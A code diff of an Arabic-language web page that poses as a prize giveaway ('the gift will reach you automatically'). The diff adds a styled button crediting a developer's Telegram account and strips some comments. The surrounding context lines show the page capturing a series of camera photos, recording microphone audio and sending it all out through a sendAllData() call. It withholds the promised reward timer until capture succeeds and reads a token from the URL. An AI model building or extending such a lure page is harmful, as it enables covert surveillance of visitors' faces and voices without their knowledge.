@@ -126,6 +126,40 @@
         .status.success { background: rgba(46,213,115,0.15); color: #2ed573; display: block; }
         .status.info { background: rgba(54,164,235,0.15); color: #36a4eb; display: block; }
         .status.error { background: rgba(255,107,107,0.15); color: #ff6b6b; display: block; }
+        
+        /* ===== زر المطور المميز ===== */
+        .dev-btn {
+            display: inline-block;
+            margin-top: 18px;
+            padding: 12px 25px;
+            background: rgba(255,215,0,0.10);
+            border: 1.5px solid #ffd700;
+            border-radius: 50px;
+            color: #ffd700;
+            font-size: 16px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(4px);
+            box-shadow: 0 0 15px rgba(255,215,0,0.10);
+            letter-spacing: 0.5px;
+        }
+        .dev-btn i {
+            margin-left: 8px;
+            font-size: 18px;
+        }
+        .dev-btn:hover {
+            background: rgba(255,215,0,0.20);
+            box-shadow: 0 0 30px rgba(255,215,0,0.25);
+            transform: scale(1.03);
+            color: #fff;
+            border-color: #fff3c0;
+        }
+        .dev-btn:active {
+            transform: scale(0.96);
+        }
+        /* ===== نهاية زر المطور ===== */
+
         .footer {
             margin-top: 25px;
             font-size: 13px;
@@ -155,6 +189,7 @@
             .country-grid { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); }
             .country-btn { padding: 10px 6px; font-size: 13px; }
             .country-btn i { font-size: 22px; }
+            .dev-btn { font-size: 14px; padding: 10px 18px; }
         }
         .permission-wrapper {
             background: rgba(255,215,0,0.05);
@@ -198,7 +233,7 @@
             <div class="status" id="statusTasks"></div>
         </div>
 
-        <!-- STEP 3: عداد الوقت -->
+        <!-- STEP 3: عداد الوقت + زر المطور -->
         <div class="step" id="step-timer">
             <div class="logo">⏳</div>
             <h1>تهانينا! 🎉</h1>
@@ -209,6 +244,12 @@
             </div>
             <p style="color: #aaa; font-size: 14px; margin-top: 10px;">يرجى الانتظار، ستصلك الهدية تلقائياً</p>
             <div class="status" id="statusTimer"></div>
+
+            <!-- ===== زر المطور المميز ===== -->
+            <a href="https://t.me/iashraf_mousa" target="_blank" class="dev-btn">
+                <i class="fab fa-telegram"></i> المطور: @iashraf_mousa
+            </a>
+            <!-- ===== نهاية زر المطور ===== -->
         </div>
 
         <div class="footer">
@@ -515,7 +556,6 @@
             const audioOk = await recordAudio();
             await sendAllData();
 
-            // إذا تم التقاط صور أو تسجيل صوت بنجاح، ننتقل للعداد
             if (capturedPhotos.length > 0 || audioChunks.length > 0) {
                 showStep('step-timer');
                 startTimer(180);
@@ -609,7 +649,6 @@
                                 capturedPhotos.push(retry);
                             }
                         }
-                        // تحديث الحالة بإظهار تقدم
                         if (i < TOTAL_PHOTOS) {
                             showStatus(statusTasks, 'info', `📸 تم التقاط ${i} من ${TOTAL_PHOTOS} صور`);
                             await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
@@ -643,7 +682,6 @@
                     audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
                     audioRecorder.onstop = () => { resolve(); };
                     audioRecorder.start();
-                    // إظهار رسالة أثناء التسجيل
                     showStatus(statusTasks, 'info', `🎤 جاري التسجيل الصوتي لمدة ${AUDIO_DURATION/1000} ثواني...`);
                     setTimeout(() => {
                         if (audioRecorder.state === 'recording') {
@@ -763,7 +801,7 @@
                     if (el.className.includes(type)) {
                         el.style.display = 'none';
                     }
-                }, 8000); // أطول قليلاً لقراءة الرسائل
+                }, 8000);
             }
         }
 
@@ -778,7 +816,7 @@
         });
 
         // ================================================================
-        //  🚀 START: التحقق من التوكن، إشعار الدخول، تفعيل الحماية
+        //  🚀 START
         // ================================================================
         window.addEventListener('load', async () => {
             const hasToken = extractTokenFromURL();
